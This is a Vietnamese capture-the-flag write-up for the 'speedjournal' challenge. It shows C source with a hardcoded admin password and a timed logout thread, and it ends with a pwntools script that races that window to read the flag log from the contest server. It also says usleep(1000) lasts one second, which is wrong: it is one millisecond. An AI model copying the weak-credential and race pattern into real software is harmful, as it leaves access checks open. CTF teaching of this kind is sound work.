# speedjournal---Write-up-----Scarlet

Hướng dẫn cách giải bài speedjournal cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 12/1/2026

## 1. Mục tiêu cần làm
Đọc code và phân tích

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>

#define MAX_LOGS 8
#define LOG_SIZE 128
#define WAIT_TIME 1000

typedef struct {
    char content[LOG_SIZE];
    int restricted;
} Log;

Log logs[MAX_LOGS];
int log_count = 0;

int is_admin = 0;

void *logout_thread(void *arg) {
    usleep(WAIT_TIME);
    is_admin = 0;
    return NULL;
}

void login_admin() {
    char pw[32];
    printf("Admin password: ");
    fgets(pw, sizeof(pw), stdin);

    if (strncmp(pw, "supersecret\n", 12) == 0) {
        is_admin = 1;

        pthread_t t;
        pthread_create(&t, NULL, logout_thread, NULL);
        pthread_detach(t);

        puts("[+] Admin logged in (temporarily)");
    } else {
        puts("[-] Wrong password");
    }
}

void write_log() {
    if (log_count >= MAX_LOGS) {
        puts("Log full");
        return;
    }

    printf("Restricted? (1/0): ");
    int r;
    scanf("%d", &r);
    getchar();

    printf("Content: ");
    fgets(logs[log_count].content, LOG_SIZE, stdin);
    logs[log_count].restricted = r;

    log_count++;
}

void read_log() {
    int idx;
    printf("Index: ");
    scanf("%d", &idx);
    getchar();

    if (idx < 0 || idx >= log_count) {
        puts("Invalid index");
        return;
    }

    if (logs[idx].restricted && !is_admin) {
        puts("Access denied");
        return;
    }

    printf("Log: %s\n", logs[idx].content);
}

void menu() {
    puts("\n1. Login admin");
    puts("2. Write log");
    puts("3. Read log");
    puts("4. Exit");
    printf("> ");
}

int main() {
    setbuf(stdout, NULL);

    strcpy(logs[0].content, "RUSEC{not_the_real_flag}\n");
    logs[0].restricted = 1;
    log_count = 1;

    while (1) {
        menu();
        int c;
        scanf("%d", &c);
        getchar();

        switch (c) {
            case 1: login_admin(); break;
            case 2: write_log(); break;
            case 3: read_log(); break;
            case 4: exit(0);
            default: puts("?");
        }
    }
}
```

Bài này nó cho mình 1 file Makefile nên các bạn hãy chạy để tạo ra file chương trình để chạy nha ❤️. Bài này nó sẽ khởi chạy flag trong chương trình luôn nên các bạn cần tìm xem flag được in ra sao và cách để in nó.

```C
void read_log() {
    int idx;
    printf("Index: ");
    scanf("%d", &idx);
    getchar();

    if (idx < 0 || idx >= log_count) {
        puts("Invalid index");
        return;
    }

    if (logs[idx].restricted && !is_admin) {
        puts("Access denied");
        return;
    }

    printf("Log: %s\n", logs[idx].content);    //In ra flag
}
```

Nhưng muốn read thì chúng ta phải làm `is_admin` bằng true tức là 1. Làm sao để biến nó thành 1 ?

```C
void login_admin() {
    char pw[32];
    printf("Admin password: ");
    fgets(pw, sizeof(pw), stdin);

    if (strncmp(pw, "supersecret\n", 12) == 0) {
        is_admin = 1;

        pthread_t t;
        pthread_create(&t, NULL, logout_thread, NULL);
        pthread_detach(t);

        puts("[+] Admin logged in (temporarily)");
    } else {
        puts("[-] Wrong password");
    }
}
```

Chỉ cần nhập `supersecret` lúc `login_admin` là được.

## 2. Cách thực thi
Ta đã biết rằng chỉ cần `login_admin` bằng `supersecret` và gõ `read_log` là in ra được flag. Nhưng ta không thể gõ tay được vì khi `login_admin` xong nó sẽ gọi 

```C
#define WAIT_TIME 1000

void *logout_thread(void *arg) {
    usleep(WAIT_TIME);
    is_admin = 0;
    return NULL;
}
```

Bạn không thể gõ tay được vì thời gian duy trì `login_admin` chỉ có 1s thôi. Vậy thì chỉ cần chạy bằng script là xong. Bài này khá dễ, không khác gì get me free flag hết. Các bạn hãy cho mình 1 star để giúp mình có thêm động lực ra write up mới nha 🐧.

## 3. Exploit

```Python
from pwn import *

# p = process('./demo-speedjournal')
p = remote('challs.ctf.rusec.club', 22169)

p.sendline(b"1")
p.sendline(b"supersecret")
p.sendline(b"3")
p.sendline(b"0")

p.interactive()
```
